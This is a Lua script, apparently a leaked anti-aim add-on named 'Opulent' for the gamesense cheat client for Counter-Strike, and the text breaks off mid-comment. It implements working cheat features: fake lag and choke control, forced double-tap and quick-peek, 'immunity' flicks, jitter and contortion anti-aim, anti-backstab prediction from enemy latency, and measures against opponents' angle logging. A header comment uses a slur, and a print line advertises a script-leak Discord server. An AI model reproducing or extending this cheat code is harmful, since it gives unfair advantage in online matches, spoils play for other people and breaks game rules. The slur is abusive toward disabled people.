-- only retards change this links
print('https://discord.gg/b37eKFbkPE <- scriptleaks new server')
-- Holds our libraries and their associated gamesense link.
local libraries = {
    [ "entity" ] = "https://gamesense.pub/forums/viewtopic.php?id=27529",
    [ "clipboard" ] = "https://gamesense.pub/forums/viewtopic.php?id=28678",
    [ "base64" ] = "https://gamesense.pub/forums/viewtopic.php?id=21619",
    [ "http" ] = "https://gamesense.pub/forums/viewtopic.php?id=19253"
}

-- Iterate over our required libraries.
for library, link in pairs( libraries ) do
    -- Use pcall to simulate the function call and catch any errors.
    if not pcall( require, "gamesense/" .. library ) then
        error( "Opulent | Please subscribe to the following library: " .. link )
    end
end

-- We have now ensured we have all the required libraries, so use them as normal.
local vector = require "vector"
local clipboard = require( "gamesense/clipboard" )
local base64 = require( "gamesense/base64" )
local http = require( "gamesense/http" )
local entity_lib = require("gamesense/entity")

-- Holds fundemental functions, variables, etc.
local opulent = {
    conditional_items = { },
    -- Listed of our updates, displayed seperately in console upon loading.
    updates = {
        beta = {
            "20.5.2023: Completely overhauled 'Randomize'",
            "20.5.2023: Reworked crosshair indicators",
            "16.5.2023: Decluttered menu, added tabs",
            "15.5.2023: Added a miss counter",
            "14.5.2023: Added more useless animations",
            "14.5.2023: Choke accounts for sv_maxusrprocessticks2",
            "13.5.2023: Added body-yaw selection",
            "12.5.2023: Added 'Flutter Strength'",
            "11.5.2023: Reworked 'prevent contortion prediction'",
            "11.5.2023: Added 'Flutter' anti-aim option",
            "11.5.2023: Added 'Full speed' anti-aim mode",
        },
        live = {
            "20.5.2023: Completely overhauled 'Randomize'",
            "20.5.2023: Reworked crosshair indicators",
            "19.5.2023: Ported most features from beta to live",
            "12.5.2023: Updated Update Log."
        }
    }
}



-- Creates a new menu item; shorter syntax and allows us to add utilities like automatic visibility handling.
-- Arguments: ui function, menu item name, visibility conditions, menu group, (optional) further ui arguments i.e. slider min/max.
function opulent.new_menu_item( o_function, name, group, conditions, ... )
    -- Create our menu item and save it to a variable for reference. ("LUA", "B" will dictate where our items spawn)
    local item = o_function( "AA", group ~= nil and group or "Anti-aimbot angles", name, ... )

    -- Is this item using visibility conditions?
    if conditions ~= nil then
        -- Add the item to the conditional items array along with it's conditions for further handling.
        opulent.conditional_items[ item ] = conditions
    end

    -- Now return the new, handled item as the process of creating a normal ui item would.
    return item
end

function opulent.lerp_color( first_color, second_color, factor )
    local new_color = { }
    -- ! Factor should be a float from 0-1
    for i=1, #first_color do
        new_color[ i ] = first_color[ i ] + ( second_color[ i ] - first_color [ i ] ) * factor
    end
    return new_color
end

function opulent.print( ... )
    client.color_log( 165, 170, 255, "Opulent \0" )
    client.color_log( 255, 255, 255, "| ", ... )
end

function opulent.gradient_text( color, color_alt, text )
    -- Create a variable store our final text in and grab our text length.
    local final_text = ""
    local text_len = #text-1

    -- Calculate the increments to achieve a gradient.
    local increments = { }
    for i=1, 4 do
        increments[ i ] = ( color_alt[ i ] - color[ i ] ) / text_len
    end

    -- Now iterate over each character of the text and apply th increment.
    for i=1, text_len+1 do
        final_text = final_text .. string.format( "\a%02x%02x%02x%02x%s", color[ 1 ], color[ 2 ], color[ 3 ], color[ 4 ], text:sub( i, i ) )

        for i=1, 4 do
            color[ i ] = color[ i ] + increments[ i ]
        end
    end

    -- Finally, return our new text.
    return final_text
end

local function includes( table, key )
    -- Iterate over the table.
    for i=1, #table do
        -- Does this member contain the key?
        if table[ i ] == key then
            return true
        end
    end

    -- No key match found, return false.
    return false
end

-- Convert time to in-game ticks.
local function time_to_ticks( t )
    return math.floor( 0.5 + ( t / globals.tickinterval( ) ) )
end

-- Convert in-game ticks to time.
local function ticks_to_time( t )
    return globals.tickinterval( ) * t
end

-- Convert an rgb color to hex code.
local function rgb_to_hex( r, g, b, a )
    return string.format( "%02x%02x%02x%02x", r or 255, g or 255, b or 255, a or 255 )
end

-- Get the length of a 3d vector.
local function length( position )
    return math.abs( position[ 1 ] ) + math.abs( position[ 2 ] ) + math.abs( position[ 3 ] )
end

-- Get the squared length of a 3d vector.
local function length_sqr( position )
    return math.abs( ( position[ 1 ] * position[ 1 ] ) + ( position[ 2 ] * position[ 2 ] ) + ( position[ 3 ] * position[ 3 ] ) )
end

-- Return a vector of the second vector subtracted by the first.
local function vector_diff( vector_1, vector_2 )
    local new_vector = { }
    for i=1, #vector_1 do
        new_vector[ i ] = vector_1[ i ] - vector_2[ i ]
    end
    return new_vector
end


local function GetClosestPoint(A, B, P) -- Function to find the closest point on the line segment AB to the point P (rave1337 (UNBAN!!!))
    local a_to_p = { P[1] - A[1], P[2] - A[2] } -- Vector from point A to point P
    local a_to_b = { B[1] - A[1], B[2] - A[2] } -- Vector from point A to point B

    local atb2 = a_to_b[1]^2 + a_to_b[2]^2 -- Squared length of the vector a_to_b (A to B)

    local atp_dot_atb = a_to_p[1]*a_to_b[1] + a_to_p[2]*a_to_b[2] -- Dot product of vectors a_to_p and a_to_b
    local t = atp_dot_atb / atb2 -- Calculate the parameter t to find the position on the line segment AB

    return { A[1] + a_to_b[1]*t, A[2] + a_to_b[2]*t } -- Calculate the closest point on the line segment AB to point P using parameter t
end

-- Our menu item references.
local references = {
    min_damage = ui.reference( "RAGE", "Aimbot", "Minimum damage" ),
    min_damage_override = { ui.reference( "RAGE", "Aimbot", "Minimum damage override" ) },
    double_tap = { ui.reference( "RAGE", "Aimbot", "Double tap" ) },
    quick_peek = { ui.reference( "RAGE", "Other", "Quick peek assist" ) },
    fake_duck = ui.reference( "RAGE", "Other", "Duck peek assist" ),
    anti_aim = ui.reference( "AA", "Anti-aimbot angles", "Enabled" ),
    pitch = { ui.reference( "AA", "Anti-aimbot angles", "Pitch" ) },
    yaw_base = ui.reference( "AA", "Anti-aimbot angles", "Yaw base" ),
    yaw = { ui.reference( "AA", "Anti-aimbot angles", "Yaw" ) },
    yaw_jitter = { ui.reference( "AA", "Anti-aimbot angles", "Yaw jitter" ) },
    body_yaw = { ui.reference( "AA", "Anti-aimbot angles", "Body yaw" ) },
    freestanding_body_yaw = ui.reference( "AA", "Anti-aimbot angles", "Freestanding body yaw" ),
    edge_yaw = ui.reference( "AA", "Anti-aimbot angles", "Edge yaw" ),
    freestanding = { ui.reference( "AA", "Anti-aimbot angles", "Freestanding" ) },
    roll = ui.reference( "AA", "Anti-aimbot angles", "Roll" ),
    fake_lag = { ui.reference( "AA", "Fake lag", "Enabled" ) },
    fake_lag_amount = ui.reference( "AA", "Fake lag", "Amount" ),
    fake_lag_variance = ui.reference( "AA", "Fake lag", "Variance" ),
    fake_lag_limit = ui.reference( "AA", "Fake lag", "Limit" ),
    leg_movement = ui.reference( "AA", "Other", "Leg movement" ),
    slow_motion = { ui.reference( "AA", "Other", "Slow motion" ) },
    on_shot = { ui.reference( "AA", "Other", "On shot anti-aim" ) },
    player_list = ui.reference( "PLAYERS", "Players", "Player list" ),
    sv_maxusrcmdprocessticks = ui.reference("misc", "settings", "sv_maxusrcmdprocessticks2")

}

-- Holds all of our anti-aim related functions and variables.
local anti_aim = {
    -- The custom states that will be used to determine our anti-aim.
    states = { "Default", "Safe", "Standing", "Running", "Full-speed", "Ducking", "In air", "Air duck", "High ground", "Low ground", "Slow motion" },
    -- Our current anti-aim state.
    state = 1,
    -- The string of our current anti-aim stage.
    stage = "Regular",
    -- Whether or not we're able to be backstabbed.
    backstab = false,
    -- Our ping threshold before safety triggers.
    ping_threshold = 0,
    -- The maximum ping before safety is triggered.
    max_ping_threshold = 25,
    -- Do we want to force freestanding?
    force_freestanding = false,
    -- Our last valid previous simulation time; used for defensive.
    old_simtime = 0,
    -- An array that holds our previous latencies.
    latency_list = { },
    -- Are we in defensive?
    in_defensive = false,
    -- The duration of the last defensive trigger.
    defensive_duration = 0,
    -- Is the user attempting to choke?
    attempting_choke = false,
    -- The last time we forced defensive.
    last_force_defensive = 0,
    -- Like above, dictates whether we should force immunity.
    force_immunity = false,
    -- Decides our fake lag choke limit.
    choke_limit = 1,
    -- Our list of local player origins.
    origin_list = { },
    -- The array that holds our player indexes and their safety condition.
    safe = { },
    last_in_air = 0,
    miss_counter_round = 0,
    miss_counter_game = 0,
    local_damaged = false,
    delay = 0,
    head_hitbox = {0, 0, 0},
    contortion_amount = 0,
    body_yaw = "d"
}


-- Our menu items. The reason we're defining the array first serves both an aesthetic and practical purpose, to use
-- menu items in our visibility conditions they need to already be defined thus creating them all in the same
-- array which will initialize them at the same time won't work and any 'fix' would be ghetto.. also this looks nice.
local items = { }

-- Format: new_menu_item( desired ui function, item name, (optional) group, (optional) visibility conditions, (optional) item arguments )
-- Visibility conditions format example: { { anti_aim, true }, { anti_aim_type, "jitter" }, { jitter_strength, 50 } }
-- This will make the item visible if anti aim is true, the anti aim type is jitter and the jitter strength is 50.
items.master_switch = opulent.new_menu_item( ui.new_checkbox, "\n" )
items.master_switch_label = opulent.new_menu_item( ui.new_label, "Opulent" )


items.tab = opulent.new_menu_item(ui.new_combobox, "Tab", nil, {{items.master_switch, true}}, "rage", "anti-aim", "visuals", "misc")

-- misc settings
items.debug_panel = opulent.new_menu_item( ui.new_checkbox, "Debug panel", nil, {{items.tab, "misc"}})
items.debug_logs = opulent.new_menu_item( ui.new_checkbox, "Debug logs", nil, {{items.tab, "misc"}} )
items.clan_tag = opulent.new_menu_item( ui.new_checkbox, "Clan tag", nil, {{items.tab, "misc"}} )

-- anti-aim settings
items.anti_aim = opulent.new_menu_item( ui.new_checkbox, "Anti-aim", nil, {{items.tab, "anti-aim"}} )
items.anti_aim_options = opulent.new_menu_item( ui.new_multiselect, "Anti-aim options", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } }, "Optimize leg movement", "Anti-backstab", "Desync on use", "Prevent harmful fakelag", "Immunity flick", "Edge yaw" )
--items.twist_in_air = opulent.new_menu_item( ui.new_checkbox, "Twist in air", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" }} )
--items.twist_in_air_type = opulent.new_menu_item( ui.new_combobox, "Twist mode", nil, { { items.anti_aim, true }, { items.twist_in_air, true }, { items.tab, "anti-aim" } }, "Spin", "Avoidance" )
items.freestanding = opulent.new_menu_item( ui.new_checkbox, "Freestanding", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } } )
items.freestand_key = opulent.new_menu_item( ui.new_hotkey, "Freestanding key", nil, { { items.anti_aim, true }, { items.tab, "anti-aim" } }, true )
items.anti_aim_state = opulent.new_menu_item( ui.new_combobox, "Custom state", nil, { { items.anti_aim, true, }, { items.tab, "anti-aim" } }, table.unpack( anti_aim.states ) )

-- Visuals
items.visuals_label = opulent.new_menu_item( ui.new_label, "Visuals", nil, { { items.tab, "visuals" } } )
items.miss_counter = opulent.new_menu_item(ui.new_checkbox, "Miss counter", nil, { { items.tab, "visuals" } })
items.animations = opulent.new_menu_item(ui.new_combobox, "Animations", nil, { { items.tab, "visuals" } }, "Off", "Skydive mode", "Funny legs", "Funny legs always")
items.indicator_enable = opulent.new_menu_item( ui.new_checkbox, "Display crosshair indicators", nil, { { items.tab, "visuals" } } )
items.safety_flag = opulent.new_menu_item( ui.new_checkbox, "Display safety flag", nil, { { items.tab, "visuals" } } )

items.fake_lag_label = opulent.new_menu_item( ui.new_label, "Fake lag info", "Fake lag", { { items.anti_aim, true } } )
items.fake_lag_label_info = opulent.new_menu_item( ui.new_label, "choke: 0 | force: 0", "Fake lag", { { items.anti_aim, true } } )

-- rage settings
items.ideal_tick = opulent.new_menu_item( ui.new_checkbox, "Ideal tick", nil, {{items.tab, "rage"}} )
items.ideal_tick_key = opulent.new_menu_item( ui.new_hotkey, "Ideal tick key", nil, {{items.tab, "rage"}}, true )
items.ideal_tick_options = opulent.new_menu_item( ui.new_multiselect, "Ideal tick options", nil, { { items.tab, "rage" }, { items.ideal_tick, true } }, "Freestanding", "Immunity" )
items.double_tap_restore = opulent.new_menu_item( ui.new_combobox, "Double tap restore", nil, { {items.tab, "rage"}, { items.ideal_tick, true } }, "Always on", "On hotkey", "Toggle", "Off hotkey" )
items.quick_peek_restore = opulent.new_menu_item( ui.new_combobox, "Quick peek restore", nil, { { items.tab, "rage" }, { items.ideal_tick, true } }, "Always on", "On hotkey", "Toggle", "Off hotkey" )

-- Now, we have to handle the anti-aim menu items; we'll start by predefining these arrays as to not access nil members.
items.state_enabled = { }
items.anti_aim_type = { }
items.yaw_offset = { }
items.force_immunity = { }
items.safety_triggers = { }
items.danger_threshold = { }
items.jitter_strength = { }
items.prevent_logging = { }
items.contortion_strength = { }
items.flutter = { }
items.flutter_strength = { }
items.contortion_body_yaw = { }

items.prevent_prediction = { }
items.randomize_contortion = { }

-- Iterate over our different anti-aim states.
for i=1, #anti_aim.states do
    -- The mini master switch which decides if we want to use this mode. Must be defined prior to the visibility check.
    items.state_enabled[ i ] = opulent.new_menu_item( ui.new_checkbox, string.format( "[ %s ] Enabled", anti_aim.states[ i ] ), nil, { { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.tab, "anti-aim" } } )

    -- The visibility check, determines whether or not we want to show all of this state's items.
    local generic_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.tab, "anti-aim" } }

    -- List of the state's items.
    items.anti_aim_type[ i ] = opulent.new_menu_item( ui.new_combobox, "Type", nil, generic_conditions, "Jitter", "Contortion" )
    items.safety_triggers[ i ] = opulent.new_menu_item( ui.new_multiselect, "Safety triggers", nil, generic_conditions, "Dangerous enemy", "Unviable anti-aim" )
    items.danger_threshold[ i ] = opulent.new_menu_item( ui.new_slider, "Danger threshold", nil, generic_conditions, 1, 100, 100, true, "%" )
   -- items.yaw_offset[ i ] = opulent.new_menu_item( ui.new_slider, "Yaw offset", nil, generic_conditions, -30, 30, 0, true, "°" )

    -- The visibility conditions for our jitter items.
    local jitter_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Jitter" }, { items.tab, "anti-aim" } }

    items.jitter_strength[ i ] = opulent.new_menu_item( ui.new_slider, "Jitter strength", nil, jitter_conditions, 1, 100, 50, true, "%" )
    items.prevent_logging[ i ] = opulent.new_menu_item( ui.new_checkbox, "Prevent angle logging", nil, jitter_conditions )

    -- The visibility conditions for our contortion items.
    local contortion_conditions = { { items.state_enabled[ i ], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[ i ] }, { items.anti_aim_type[ i ], "Contortion" }, { items.tab, "anti-aim" } }

    -- The visibility conditions for flutter strength.
    --local flutter_conditions = { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.flutter[i], true } }


    items.contortion_strength[ i ] = opulent.new_menu_item( ui.new_slider, "Contortion strength", nil, contortion_conditions, 1, 100, 50, true, "%" )
    --items.flutter[ i ] = opulent.new_menu_item( ui.new_checkbox, "Flutter", nil, contortion_conditions )
    --items.flutter_strength[i] = opulent.new_menu_item(ui.new_combobox, "Flutter Strength", nil, { { items.state_enabled[i], true }, { items.anti_aim, true }, { items.tab, "anti-aim" }, { items.anti_aim_state, anti_aim.states[i] }, { items.anti_aim_type[i], "Contortion" }, { items.flutter[i], true } }, "Low", "Medium", "High")
    items.contortion_body_yaw[ i ] = opulent.new_menu_item( ui.new_combobox, "Body Yaw", nil, contortion_conditions, "Jitter", "Opposite" )

    items.prevent_prediction[ i ] = opulent.new_menu_item( ui.new_checkbox, "Prevent contortion prediction", nil, contortion_conditions )
    items.randomize_contortion[ i ] = opulent.new_menu_item( ui.new_checkbox, "Randomize", nil, contortion_conditions )
    items.force_immunity[ i ] = opulent.new_menu_item( ui.new_checkbox, string.format( "Force immunity on %s", anti_aim.states[ i ]:lower( ) ), nil, generic_conditions )
end

-- Array to hold all of our ideal tick info.
local ideal_tick = {
    previous_weapon = nil,
    active = false,
    should_reset = false,
    last_restore_type = { "", "" }
}

function ideal_tick.run( cmd )
    -- Reset our activity variable to false.
    ideal_tick.active = false

    -- We don't want to run this is we aren't using the anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    local quick_peek_restore = ui.get( items.quick_peek_restore )
    local double_tap_restore = ui.get( items.double_tap_restore )

    -- Return if ideal tick isn't enabled via both the checkbox and keybind.
    if not ui.get( items.ideal_tick ) or not ui.get( items.ideal_tick_key ) then
        if ui.get( items.ideal_tick ) then
            if ideal_tick.last_restore_type[ 1 ] ~= quick_peek_restore or ideal_tick.last_restore_type[ 2 ] ~= double_tap_restore then
                ui.set( references.quick_peek[ 2 ], ui.get( items.quick_peek_restore ) )
                ui.set( references.double_tap[ 2 ], ui.get( items.double_tap_restore ) )
                last_restore_type = { quick_peek_restore, double_tap_restore }
            end
        end
        
        -- We have a valid original keybind mode available, so use it.
        if ideal_tick.should_reset then
            -- Set the user's keybind modes back to their original values.
            ui.set( references.quick_peek[ 2 ], ui.get( items.quick_peek_restore ) )
            ui.set( references.double_tap[ 2 ], ui.get( items.double_tap_restore ) )
            ideal_tick.should_reset = false
        end
        return
    end

    -- No matter what, we want quick peek and double tap active.
    ui.set( references.quick_peek[ 2 ], "Always on" )
    ui.set( references.double_tap[ 2 ], "Always on" )

    -- Let the lua know we want to force freestanding.
    if includes( ui.get( items.ideal_tick_options ), "Freestanding" ) then
        anti_aim.force_freestanding = true
    end

    -- Simply force defensive if the user desires it.
    if includes( ui.get( items.ideal_tick_options ), "Immunity" ) then
        anti_aim.force_immunity = true
    end

    -- Set our activity variable to true.
    ideal_tick.active = true
    ideal_tick.should_reset = true
end

function anti_aim.grab_ping( ent )
    -- Grab our player resource.
    local player_resource = entity.get_all( "CCSPlayerResource" )[ 1 ]
    -- Return the latency prop.
    return entity.get_prop( player_resource, string.format( "%03d", ent ) )
end

function anti_aim.get_fakeduck_latency( ent )
    -- Grab the player's ESP data.
    local esp_data = entity.get_esp_data( ent )
    -- Is this user fakeducking? 9 is the index for the fakeduck flag, 512 means active.
    -- credit: https://gamesense.pub/forums/viewtopic.php?id=34280
    local is_fakeducking = bit.band( esp_data.flags, bit.lshift( 1, 9 ) ) == 512

    -- If the player isn't fakeducking, return 0.
    if not is_fakeducking then
        return 0
    end

    -- Grab our latency, the player's simulation time and curtime.
    local latency = client.latency( ) / 2
    local simtime = entity.get_prop( ent, "m_flSimulationTime" )
    local curtime = globals.curtime( )

    -- The current time subtracted by the enemy's simulation time will give us their
    -- choke; add our latency onto this to account for the delayed data we're receiving.
    local shot_delay = latency + curtime - simtime
    -- Now we have their choke on the server, subtract 14 by it and we have how many
    -- ticks it will take until the enemy hits their maximum choke, or, their shot delay.
    shot_delay = 14 - ( time_to_ticks( shot_delay ) % 14 )

    return ticks_to_time( shot_delay ) * 100
end

function anti_aim.extrapolate( ent, ticks )
    -- Create our local player variables.
    local velocity = { entity.get_prop( ent, "m_vecVelocity" ) }
    local origin = { entity.get_origin( ent ) }
    -- Save the gravity and jump impulse to variables.
    local gravity = cvar.sv_gravity:get_float( )
    local jump_impulse = cvar.sv_jump_impulse:get_float( )
    -- Are we in the air?
    local in_air = bit.band( entity.get_prop( ent, "m_fFlags" ), 1 ) == 0

    -- Re-extrapolate for our desired amount of ticks.
    for i=1, ticks do
        -- Are we in the air?
        if in_air then
            -- Subtract the gravity from our z velocity.
            velocity[ 3 ] = velocity[ 3 ] - ticks_to_time( gravity )
        end

        -- Iterate over our origin (x, y and z).
        for j=1, #origin do
            -- Add our velocity multiplied by the tick interval to the position.
            origin[ j ] = origin[ j ] + velocity[ j ] * globals.tickinterval( )
        end
    end

    -- Return the newly extrapolated position.
    return origin
end

function anti_aim.handle_safety( )
    -- Save the safty triggers to an array for further use.
    local safety_triggers = ui.get( items.safety_triggers[ anti_aim.state ] )
    
    -- Grab an array with our enemy indexes.
    local enemies = entity.get_players( true )

    -- Iterate over our enemy array.
    for i=1, globals.maxplayers( ) do
        -- Grab our target from the array.
        local target = i

        -- If this entity isn't alive or an enemy, continue.
        if not entity.is_alive( target) or not entity.is_enemy( target ) then
            goto continue
        end

        -- Override this player's value in our safety array with true.
        anti_aim.safe[ target ] = true

        -- Do we have any safety triggers?
        if #safety_triggers > 0 then
            -- Check if the user has selected the "Dangerous enemy" condition.
            if includes( safety_triggers, "Dangerous enemy" ) then
                -- Grab our target's ping.
                local target_ping = anti_aim.grab_ping( target )
                -- Get our danger threshold for this state.
                local danger_threshold = ui.get( items.danger_threshold[ anti_aim.state ] )
                -- Now calculate the user's desired % and save the value; we want a minimum value of 5
                -- so we're also going to subtract 5 from the max and add 5 afterwards.
                anti_aim.ping_threshold = math.floor( ( danger_threshold * ( anti_aim.max_ping_threshold - 5 ) ) / 100 )
                anti_aim.ping_threshold = anti_aim.ping_threshold + 5

                -- Add the target's fakeduck latency to their ping.
                target_ping = target_ping + anti_aim.get_fakeduck_latency( target )

                -- Finally, mark ourselves unsafe if their ping is considered dangerous.
                if target_ping <= anti_aim.ping_threshold then
                    anti_aim.safe[ target ] = false
                end
            end

            -- Check if the user has selected the "Unviable anti-aim" condition.
            if includes( safety_triggers, "Unviable anti-aim" ) then
                -- Are we trying to choke or currently choking more than 2 commands?
                if anti_aim.attempting_choke or globals.chokedcommands( ) > 2 then
                    -- Our anti-aim is unviable, set the target's safety to false.
                    anti_aim.safe[ target ] = false
                end
            end
        end

        ::continue::
    end
end

function anti_aim.handle_state( )
    -- Ensure we have the anti-aim master switch enabled.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Grab our local player for repeated usage.
    local local_player = entity.get_local_player( )
    -- Grab our current target.
    local target = client.current_threat( )

    -- Grab our velocity then calculate speed.
    local velocity = { entity.get_prop( local_player, "m_vecVelocity" ) }
    local speed = math.sqrt( velocity[ 1 ] ^ 2 + velocity[ 2 ] ^ 2 )
    --print(tostring(speed))
    -- Use bit.band to find out whether or not we're in the air.
    local in_air = bit.band( entity.get_prop( local_player, "m_fFlags" ), 1 ) == 0

    if in_air then
        anti_aim.last_in_air = globals.tickcount( )
    end

    local landing = not in_air and globals.tickcount( ) - anti_aim.last_in_air < 4

    -- Grab our duck amount.
    local duck_amount = entity.get_prop( local_player, "m_flDuckAmount" )
    
    -- Create our z difference variable in the setting scope.
    local enemy_z_difference = 0

    if target ~= nil then
        -- Grab both the target and our own origin's within an array.
        local local_origin = { entity.get_origin( local_player ) }
        local target_origin = { entity.get_origin( target ) }

        -- Calculate the z difference by subtracting the local z axis from the target's.
        enemy_z_difference = local_origin[ 3 ] - target_origin[ 3 ]
    end

    -- Our conditions. The numbers go in the order of the states found in anti_aim.states.
    local conditions = {
        [ 1 ] = true, -- Default
        [ 2 ] = false, -- Safe
        [ 3 ] = speed <= 1.1 and not in_air, -- Standing
        [ 4 ] = speed > 1.1 and not in_air, -- Running
        [ 5 ] = speed > 220 and not in_air, -- Full speed
        [ 6 ] = duck_amount > 0 or ui.get( references.fake_duck ), -- Crouching
        [ 7 ] = in_air or landing, -- Air
        [ 8 ] = duck_amount > 0 and in_air, -- Crouching in air
        [ 9 ] = enemy_z_difference > 64, -- High ground
        [ 10 ] = enemy_z_difference < -64, -- Low ground
        [ 11 ] = ui.get( references.slow_motion[ 2 ] ) -- Slow motion
    }

    -- Iterate over the conditions
    for i=1, #conditions do
        -- Have we enabled this state and is the condition true?
        if ui.get( items.state_enabled[ i ] ) and conditions[ i ] then
            -- Finally, set our state to the most recent one.
            anti_aim.state = i
        end
    end

    -- Run our safety handling, this must be done after the type processing.
    anti_aim.handle_safety( )

    -- Is our target valid and considered unsafe?
    if target ~= nil and not anti_aim.safe[ target ] then
        -- Set our anti-aim state to safe and return.
        anti_aim.state = 2
        return
    end
end

function anti_aim.anti_backstab( )
    -- Reset our backstab variable.
    anti_aim.backstab = false

    -- Ensure we're using anti-aim and want to use anti-backstab.
    if not ui.get( items.anti_aim ) or not includes( ui.get( items.anti_aim_options ), "Anti-backstab" ) then
        return
    end

    -- Save our basic resources.
    local latency = client.latency( ) + ticks_to_time( 1 )
    local resources = entity.get_all("CCSPlayerResource")

    -- Grab a list of the enemies.
    local enemies = entity.get_players( true )

    -- Now, iterate over that list.
    for i=1, #enemies do
        -- Save our current enemy as well as their latency, weapon and weapon name.
        local enemy = enemies[ i ]
        local enemy_latency = anti_aim.grab_ping( enemy ) / 1000
        local weapon = entity.get_player_weapon( enemy )
        local weapon_name = entity.get_classname( weapon )

        -- Enemy isn't using a knife, continue.
        if weapon_name ~= "CKnife" then
            goto continue
        end
        
        -- Calculate how many ticks ahead the enemy is on their client.
        local extrapolation = time_to_ticks( ( enemy_latency / 2 ) + ( latency / 2 ) ) + 1
        -- Now, extrapolate their position by that amount to get where they are locally.
        local extrapolated_pos = anti_aim.extrapolate( enemy, extrapolation )

        -- Create arrays that hold our position on the server and where we can be backtracked to.
        local server_pos = anti_aim.origin_list[ time_to_ticks( latency / 2 ) ]
        local backtrack_pos = anti_aim.origin_list[ extrapolation + time_to_ticks( 0.2 ) ]

        -- If our delayed position is nil, continue.
        if server_pos == nil or backtrack_pos == nil then
            goto continue
        end

        -- Calculate the differences between our server/backtrack position and the enemy position.
        local server_diff = vector_diff( server_pos, extrapolated_pos )
        local backtrack_diff = vector_diff( backtrack_pos, extrapolated_pos )

        -- Now, calculate the delta of those vectors.
        local server_delta = length_sqr( server_diff )
        local backtrack_delta = length_sqr( backtrack_diff )

        -- If the difference is under 1600, we're likely able to be knifed.
        if server_delta < 3000 or backtrack_delta < 3000 then
            -- Make sure we unchoke to update our angle.
            anti_aim.choke_limit = 1
            anti_aim.backstab = true
            break
        end

        ::continue::
    end
end

function anti_aim.run( )
    -- Ensure we have the anti-aim master switch enabled.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Grab our flutter strength for further use. 
    --local flutter_strength = ui.get(items.flutter_strength[anti_aim.state])

    -- Grab our body-yaw for futher use.
    local body_yaw = ui.get(items.contortion_body_yaw[anti_aim.state])
    
    -- Grab our state for further use.
    local state = anti_aim.state

    -- Set our default stage.
    anti_aim.stage = "Regular"

    -- Create an array for the final anti-aim we'll play, this allows easy modification.
    -- Format: [ "key we'll access with" ] = { reference to menu item, value(s) to set }.
    local new_anti_aim = {
        [ "Enabled" ] = { references.anti_aim, true },
        [ "Pitch" ] = { references.pitch, { "Down", 0 } },
        [ "Yaw base" ] = { references.yaw_base, "At targets" },
        [ "Yaw" ] = { references.yaw, { "180", 0 } },
        [ "Yaw jitter" ] = { references.yaw_jitter, { "Off", 0 } },
        [ "Body yaw" ] = { references.body_yaw, { "Static", 90 } },
        [ "FS body yaw" ] = { references.freestanding_body_yaw, false }
    }

    if includes( ui.get( items.anti_aim_options ), "Optimize leg movement" ) then
        local velocity = { entity.get_prop( entity.get_local_player(), "m_vecVelocity" ) }
        local should_slide = length( velocity ) > 150

        ui.set( references.leg_movement, should_slide and "Never slide" or "Always slide" )
    end

    -- Our the set anti-aim type for the current state.
    local current_anti_aim_type = ui.get( items.anti_aim_type[ state ] )

    -- Create a variable to tell whether or not the immunity that just got triggered was forced.
    local immunity_forced = globals.curtime( ) - anti_aim.last_force_defensive < 0.5

    -- Do we have immunity flick enabled and are we currently in defensive? If so, force our type to defensive.
    if includes( ui.get( items.anti_aim_options ), "Immunity flick" ) and anti_aim.in_defensive and not immunity_forced then
        current_anti_aim_type = "Defensive"
    -- Do we want to trigger the anti-backstab anti-aim?
    elseif anti_aim.backstab then
        current_anti_aim_type = "Backstab"
    end

    -- Is our current anti-aim type jitter?
    if current_anti_aim_type == "Jitter" then
        -- How many degrees do we want to allow this user to jitter?
        local max_jitter_range = 120
        -- Now, use the max range to calculate the % that the user has selected.
        local jitter_range = math.floor( ( ui.get( items.jitter_strength[ state ] ) * max_jitter_range ) / 100 )

        -- Do we want to prevent logging and are we in the correct cycle for it?
        if ui.get( items.prevent_logging[ state ] ) and globals.tickcount( ) % 14 >= 10 then
            -- Set our jitter range to 0.
            jitter_range = 0
            anti_aim.stage = "Reset"
        else
            anti_aim.stage = "Jitter"
        end

        -- Apply the jitter values.
        new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Center", jitter_range }
        new_anti_aim[ "Body yaw" ][ 2 ] = { "Jitter", 90 }


    --Is our current anti-aim type contortion?
    elseif current_anti_aim_type == "Contortion" then
        -- How many degrees should we allow the user to contort off the center?
        local max_contortion_range = 0

        if body_yaw == "Jitter" then 
            max_contortion_range = 120
            anti_aim.body_yaw = "J"
       elseif body_yaw == "Opposite" then
            max_contortion_range = 45
            anti_aim.body_yaw = "O"
       end


        -- Use the same math as we used for the jitter to calculate the % that the user wants.
        local contortion_range = math.floor( ( ui.get( items.contortion_strength[ state ] ) * max_contortion_range ) / 100 )

        if ui.get(items.prevent_prediction[state]) and globals.tickcount() % 30 >= 24 then
            -- Set our contortion range to 10-25 randomly.
            contortion_range = math.random(10, 25)
            anti_aim.contortion_amount = contortion_range
            anti_aim.stage = "Reset"
        else
            anti_aim.stage = "Contortion"
            anti_aim.contortion_amount = contortion_range
        end
        

        
        --NOTE(Sid): I think implementing some kind of antibrute here would work extremely well. 
--[[
        if ui.get(items.flutter[state]) and flutter_strength == "Low" and globals.tickcount() % 18 == 0 then
            local current_tick = globals.tickcount() % 360
            local new_yaw = current_tick < 90 and 10 - math.floor(current_tick / 9) or -10 + math.floor((current_tick - 90) / 9)
            new_anti_aim["Yaw"][2] = {"180", new_yaw}
            anti_aim.stage = "Reset"
        elseif flutter_strength == "Medium" and globals.tickcount() % 18 == 0 then
            local current_tick = globals.tickcount() % 360
            local new_yaw = current_tick < 180 and 20 - math.floor(current_tick / 18) or -20 + math.floor((current_tick - 180) / 18)
            new_anti_aim["Yaw"][2] = {"180", new_yaw}
            anti_aim.stage = "Reset"
        elseif flutter_strength == "High" and globals.tickcount() % 18 == 0 then
